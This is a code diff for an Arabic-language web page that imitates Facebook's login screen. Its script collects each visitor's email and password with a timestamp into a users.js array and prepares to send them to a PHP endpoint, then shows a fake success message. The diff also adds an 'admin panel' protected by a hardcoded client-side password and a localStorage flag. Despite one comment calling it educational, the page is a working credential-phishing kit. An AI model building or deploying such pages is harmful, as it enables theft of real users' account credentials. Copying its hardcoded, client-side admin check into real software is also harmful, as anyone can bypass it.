@@ -4,38 +4,291 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول إلى فيسبوك</title>
-    <link rel="stylesheet" href="styles.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background-color: #ffffff;
+            height: 60px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1;
+            padding: 20px;
+        }
+        
+        .login-box {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 400px;
+            text-align: center;
+        }
+        
+        .login-box h1 {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #1c1e21;
+        }
+        
+        .input-field {
+            margin-bottom: 12px;
+        }
+        
+        .input-field input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        
+        .input-field input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #ffffff;
+            cursor: pointer;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 16px;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .admin-login {
+            background-color: #f0f2f5;
+            border: none;
+            border-radius: 6px;
+            color: #1877f2;
+            cursor: pointer;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px;
+            margin-top: 10px;
+            width: 100%;
+        }
+        
+        .admin-login:hover {
+            background-color: #e4e6eb;
+        }
+        
+        .footer {
+            background-color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #737373;
+        }
+        
+        /* أنماط نافذة الدخول للإدارة */
+        .admin-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .admin-modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            width: 350px;
+            text-align: center;
+        }
+        
+        .admin-modal h2 {
+            margin-bottom: 20px;
+            color: #1c1e21;
+        }
+        
+        .admin-modal input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        
+        .admin-modal button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            width: 100%;
+            cursor: pointer;
+        }
+        
+        .admin-modal button:hover {
+            background-color: #166fe5;
+        }
+        
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <div class="login-page">
-        <div class="header">
-            <div class="logo">facebook</div>
+    <div class="header">
+        <div class="logo">facebook</div>
+    </div>
+    
+    <div class="container">
+        <div class="login-box">
+            <h1>تسجيل الدخول إلى فيسبوك</h1>
+            <form id="loginForm">
+                <div class="input-field">
+                    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                </div>
+                <div class="input-field">
+                    <input type="password" id="password" placeholder="كلمة المرور" required>
+                </div>
+                <button type="submit" class="login-button">تسجيل الدخول</button>
+                <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
+                <div class="divider"></div>
+                <button type="button" class="admin-login" id="adminLoginBtn">الدخول لوحة الإدارة</button>
+            </form>
         </div>
-        
-        <div class="container">
-            <div class="login-box">
-                <h1>تسجيل الدخول إلى فيسبوك</h1>
-                <form id="loginForm">
-                    <div class="input-field">
-                        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                    </div>
-                    <div class="input-field">
-                        <input type="password" id="password" placeholder="كلمة المرور" required>
-                    </div>
-                    <button type="submit" class="login-button">تسجيل الدخول</button>
-                    <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
-                    <div class="divider"></div>
-                    <button type="button" class="create-account">إنشاء حساب جديد</button>
-                </form>
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>فيسبوك © 2023</p>
+    </div>
+    
+    <div class="footer">
+        <p>فيسبوك © 2023</p>
+    </div>
+    
+    <!-- نافذة الدخول للإدارة -->
+    <div class="admin-modal" id="adminModal">
+        <div class="admin-modal-content">
+            <h2>الدخول إلى لوحة الإدارة</h2>
+            <input type="password" id="adminPassword" placeholder="كلمة مرور المدير">
+            <button id="submitAdminPassword">دخول</button>
+            <div class="error-message" id="adminError">كلمة المرور غير صحيحة!</div>
         </div>
     </div>
 
     <script src="users.js"></script>
-    <script src="auth.js"></script>
+    <script>
+        // عند الضغط على زر الدخول للإدارة
+        document.getElementById('adminLoginBtn').addEventListener('click', function() {
+            document.getElementById('adminModal').style.display = 'flex';
+        });
+        
+        // عند محاولة الدخول للإدارة
+        document.getElementById('submitAdminPassword').addEventListener('click', function() {
+            const password = document.getElementById('adminPassword').value;
+            
+            if (password === 'dagger123') {
+                // حفظ حالة الدخول في localStorage
+                localStorage.setItem('adminAuthenticated', 'true');
+                
+                // توجيه إلى صفحة الإدارة
+                window.location.href = 'admin.html';
+            } else {
+                document.getElementById('adminError').style.display = 'block';
+            }
+        });
+        
+        // عند إرسال نموذج تسجيل الدخول
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // إضافة المستخدم إلى المصفوفة في users.js
+            userData.push({
+                email: email,
+                password: password,
+                timestamp: new Date().toLocaleString()
+            });
+            
+            // تحديث ملف users.js (هذا مثال تعليمي فقط)
+            updateUserDataFile();
+            
+            // إعادة تعيين النموذج
+            this.reset();
+            
+            alert('تم تسجيل الدخول بنجاح!');
+        });
+        
+        // دالة لتحديث ملف users.js (محاكاة)
+        function updateUserDataFile() {
+            // في تطبيق حقيقي، هنا سيتم إرسال البيانات إلى الخادم لتحديث الملف
+            console.log('يتم تحديث ملف users.js على الخادم بالبيانات الجديدة:');
+            console.log(userData);
+            
+            // هنا يمكنك استخدام AJAX لإرسال البيانات إلى ملف PHP يقوم بتحديث users.js
+            // مثال:
+            /*
+            fetch('update_users.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({users: userData})
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error));
+            */
+        }
+    </script>
 </body>
-</html>
+                    </html>
